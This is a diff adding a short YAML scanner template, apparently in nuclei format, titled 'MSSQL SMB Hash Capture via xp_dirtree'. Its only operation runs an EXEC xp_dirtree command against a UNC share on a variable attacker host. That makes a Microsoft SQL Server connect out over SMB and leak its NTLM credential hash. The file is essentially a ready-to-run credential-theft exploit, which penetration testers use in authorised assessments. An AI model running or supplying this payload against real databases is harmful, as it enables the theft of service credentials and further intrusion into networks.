@@ -1,0 +1,18 @@
+id: mssql-smb-hash-capture
+service: [mssql]
+variables:
+  attacker_host: 10.0.0.1
+info:
+  name: MSSQL SMB Hash Capture via xp_dirtree
+  severity: high
+  tags: mssql,exploit,credential,smb,ntlm
+
+services:
+  - ops:
+      - db: "EXEC xp_dirtree '\\\\{{attacker_host}}\\zombie_share', 1, 1"
+        name: smb_trigger
+    extractors:
+      - type: regex
+        name: mssql_smb_trigger_result
+        part: smb_trigger
+        regex: ['(?m)^(.+)$']
